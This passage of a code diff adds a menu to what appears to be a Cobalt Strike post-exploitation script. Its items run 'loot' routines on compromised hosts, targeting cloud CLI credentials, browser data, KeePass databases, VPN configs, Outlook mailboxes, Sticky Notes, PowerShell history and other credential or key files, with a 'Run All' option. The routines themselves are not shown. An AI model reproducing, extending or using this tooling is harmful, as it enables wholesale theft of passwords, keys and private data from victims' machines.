+        item "Cloud CLIs (AWS/Az/GCP)"   { loot-cloud-creds(selectedBeacons()); }
+        item "PowerShell History"        { loot-ps-history(selectedBeacons()); }
+        separator;
+        item "Chrome"                    { loot-chrome(selectedBeacons()); }
+        item "Firefox"                   { loot-firefox(selectedBeacons()); }
+        item "Edge"                      { loot-edge(selectedBeacons()); }
+        separator;
+        item "Sticky Notes"              { loot-stickynotes(selectedBeacons()); }
+        item "KeePass Databases"         { loot-keepass(selectedBeacons()); }
+        item "Recent Files (MRU)"        { loot-recent(selectedBeacons()); }
+        item "VPN Configs"               { loot-vpn(selectedBeacons()); }
+        item "Outlook PST/OST"           { loot-outlook(selectedBeacons()); }
+        item "Misc Cred/Key Files"       { loot-misc(selectedBeacons()); }
+        separator;
+        item "\[Run All\] Loot Enum"     { loot-enum-all(selectedBeacons()); }
+    }
+}
